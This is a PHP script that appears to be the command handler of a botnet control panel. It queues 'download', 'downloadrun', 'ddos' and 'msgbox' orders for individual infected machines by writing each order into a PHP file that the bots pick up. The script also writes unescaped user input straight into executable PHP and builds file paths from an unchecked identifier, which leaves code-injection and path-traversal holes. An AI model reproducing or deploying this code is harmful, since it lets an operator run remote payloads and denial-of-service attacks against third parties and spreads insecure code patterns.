<?php
session_start();
include('api.php');
if (isset($_SESSION['csrftoken'])) {
    if (check_login($_SESSION['csrftoken']) == false) { header('location: index.php'); }
} else { header('location: index.php'); }
if (isset($_POST['md5ip'])) {
    if (isset($_POST['command'])) {
        if (trim($_POST['command']) !== '') {
            $cmd = trim($_POST['command']);
            if ((strpos($cmd, 'download(') !== false) || (strpos($cmd, 'downloadrun(') !== false) || (strpos($cmd, 'ddos(') !== false) || (strpos($cmd, 'msgbox(') !== false)) {
                if (!file_exists('../cm/'.$_POST['md5ip'].'.php')) {
                    $file = fopen('../cm/'.$_POST['md5ip'].'.php', 'w') or die('fail, problem with request');
                    fwrite($file, '<?php
$command_line = "'.$cmd.'";
?>');
                    fclose($file);
                    echo 'Your command sent successfully, please wait 1s.';
                    header('refresh:1; url=../panel.php');
                } else {
                    unlink('../cm/'.$_POST['md5ip'].'.php');
                    $file = fopen('../cm/'.$_POST['md5ip'].'.php', 'w') or die('fail, problem with request');
                    fwrite($file, '<?php
$command_line = "'.$cmd.'";
?>');
                    fclose($file);
                    echo 'Your command sent successfully, please wait 1s.';
                    header('refresh:1; url=../panel.php');
                }
            } else { header('location: ../command.php?err&m='.$_POST['md5ip']); }
        } else { header('location: ../command.php?err&m='.$_POST['md5ip']); }
    } else { header('location: ../command.php?err&m='.$_POST['md5ip']); }
} else { header('location: ../panel.php'); }
?>